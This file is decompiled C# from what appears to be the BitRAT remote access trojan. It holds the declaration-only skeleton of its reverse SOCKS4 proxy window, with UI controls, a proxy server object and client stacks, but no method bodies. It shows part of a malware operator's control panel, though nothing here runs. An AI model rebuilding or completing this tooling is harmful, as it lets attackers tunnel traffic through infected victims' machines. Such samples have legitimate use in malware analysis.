﻿using BitRAT;
using BrightIdeasSoftware;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Concurrent;
using System.ComponentModel;
using System.Diagnostics;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using VisualPlus.Toolkit.Controls.Interactivity;

[DesignerGenerated]
public sealed class fSocks4R : Form
{
    private IContainer icontainer_0;
    private VisualButton visualButton_0;
    private BackgroundWorker backgroundWorker_0;
    private ToolStripMenuItem toolStripMenuItem_0;
    private ToolStripMenuItem toolStripMenuItem_1;
    private ToolStripSeparator toolStripSeparator_0;
    private ToolStripMenuItem toolStripMenuItem_2;
    private ToolStripMenuItem toolStripMenuItem_3;
    private ToolStripSeparator toolStripSeparator_1;
    private ToolStripMenuItem toolStripMenuItem_4;
    private ToolStripMenuItem toolStripMenuItem_5;
    private ContextMenuStrip contextMenuStrip_0;
    private OLVColumn olvcolumn_0;
    private PictureBox pictureBox_0;
    private OLVColumn olvcolumn_1;
    private OLVColumn olvcolumn_2;
    private OLVColumn olvcolumn_3;
    private OLVColumn olvcolumn_4;
    private OLVColumn olvcolumn_5;
    private OLVColumn olvcolumn_6;
    private OLVColumn olvcolumn_7;
    private ToolStripStatusLabel toolStripStatusLabel_0;
    private StatusStrip statusStrip_0;
    private Timer timer_0;
    private OLVColumn olvcolumn_8;
    private FastObjectListView fastObjectListView_0;
    private ToolStripStatusLabel toolStripStatusLabel_1;
    private ToolStripSeparator toolStripSeparator_2;
    private ToolStripMenuItem toolStripMenuItem_6;
    private ToolStripMenuItem toolStripMenuItem_7;
    private ToolStripSeparator toolStripSeparator_3;
    private PictureBox pictureBox_1;
    private PictureBox pictureBox_2;
    public cSocks4Server cSocks4Server_0;
    public ConcurrentStack<cSocks4Rcli> concurrentStack_0;
    public ConcurrentStack<cSocks4Rcli> concurrentStack_1;
    public ConcurrentStack<cSocks4Rcli> concurrentStack_2;

    public fSocks4R();
    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing);
    private void fSocks4R_Closing(object sender, CancelEventArgs e);
    private void fSocks4R_Load(object sender, EventArgs e);
    [DebuggerStepThrough]
    private void InitializeComponent();
    public void method_0(string string_0, string string_1, string string_2, string string_3);
    public void method_1(string string_0);
    private void method_10(object sender, KeyEventArgs e);
    private void method_11(object sender, EventArgs e);
    private void method_12(object sender, FormatRowEventArgs e);
    private void method_13(object sender, EventArgs e);
    private void method_14(object sender, EventArgs e);
    private void method_15(object sender, EventArgs e);
    private void method_16(object sender, EventArgs e);
    private void method_17(object sender, EventArgs e);
    private void method_18(object sender, EventArgs e);
    private void method_19(object sender, EventArgs e);
    public void method_2(string string_0, string[] string_1);
    private void method_20(object sender, EventArgs e);
    private void method_21(object sender, EventArgs e);
    public void method_3();
    public void method_4();
    public void method_5();
    public void method_6();
    public void method_7();
    private void method_8(object sender, EventArgs e);
    private void method_9(object sender, DoWorkEventArgs e);
    internal virtual VisualButton vmethod_0();
    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_1(VisualButton visualButton_1);
    internal virtual ToolStripMenuItem vmethod_10();
    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_11(ToolStripMenuItem toolStripMenuItem_8);
    internal virtual ToolStripMenuItem vmethod_12();
    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_13(ToolStripMenuItem toolStripMenuItem_8);
    internal virtual ToolStripSeparator vmethod_14();
    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_15(ToolStripSeparator toolStripSeparator_4);
    internal virtual ToolStripMenuItem vmethod_16();
    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_17(ToolStripMenuItem toolStripMenuItem_8);
    internal virtual ToolStripMenuItem vmethod_18();
    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_19(ToolStripMenuItem toolStripMenuItem_8);
    internal virtual BackgroundWorker vmethod_2();
    internal virtual ContextMenuStrip vmethod_20();
    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_21(ContextMenuStrip contextMenuStrip_1);
    internal virtual OLVColumn vmethod_22();
    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_23(OLVColumn olvcolumn_9);
    internal virtual PictureBox vmethod_24();
    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_25(PictureBox pictureBox_3);
    internal virtual OLVColumn vmethod_26();
    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_27(OLVColumn olvcolumn_9);
    internal virtual OLVColumn vmethod_28();
    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_29(OLVColumn olvcolumn_9);
    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_3(BackgroundWorker backgroundWorker_1);
    internal virtual OLVColumn vmethod_30();
    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_31(OLVColumn olvcolumn_9);
    internal virtual OLVColumn vmethod_32();
    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_33(OLVColumn olvcolumn_9);
    internal virtual OLVColumn vmethod_34();
    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_35(OLVColumn olvcolumn_9);
    internal virtual OLVColumn vmethod_36();
    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_37(OLVColumn olvcolumn_9);
    internal virtual OLVColumn vmethod_38();
    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_39(OLVColumn olvcolumn_9);
    internal virtual ToolStripMenuItem vmethod_4();
    internal virtual ToolStripStatusLabel vmethod_40();
    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_41(ToolStripStatusLabel toolStripStatusLabel_2);
    internal virtual StatusStrip vmethod_42();
    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_43(StatusStrip statusStrip_1);
    internal virtual Timer vmethod_44();
    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_45(Timer timer_1);
    internal virtual OLVColumn vmethod_46();
    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_47(OLVColumn olvcolumn_9);
    internal virtual FastObjectListView vmethod_48();
    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_49(FastObjectListView fastObjectListView_1);
    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_5(ToolStripMenuItem toolStripMenuItem_8);
    internal virtual ToolStripStatusLabel vmethod_50();
    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_51(ToolStripStatusLabel toolStripStatusLabel_2);
    internal virtual ToolStripSeparator vmethod_52();
    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_53(ToolStripSeparator toolStripSeparator_4);
    internal virtual ToolStripMenuItem vmethod_54();
    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_55(ToolStripMenuItem toolStripMenuItem_8);
    internal virtual ToolStripMenuItem vmethod_56();
    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_57(ToolStripMenuItem toolStripMenuItem_8);
    internal virtual ToolStripSeparator vmethod_58();
    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_59(ToolStripSeparator toolStripSeparator_4);
    internal virtual ToolStripMenuItem vmethod_6();
    internal virtual PictureBox vmethod_60();
    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_61(PictureBox pictureBox_3);
    internal virtual PictureBox vmethod_62();
    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_63(PictureBox pictureBox_3);
    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_7(ToolStripMenuItem toolStripMenuItem_8);
    internal virtual ToolStripSeparator vmethod_8();
    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_9(ToolStripSeparator toolStripSeparator_4);

    private delegate void Delegate161(string string_0, string[] string_1);

    private delegate void Delegate162();

    private delegate void Delegate163();

    private delegate void Delegate164();

    private delegate void Delegate165(string string_0);

    private delegate void Delegate166(string string_0, string string_1, string string_2, string string_3);
}

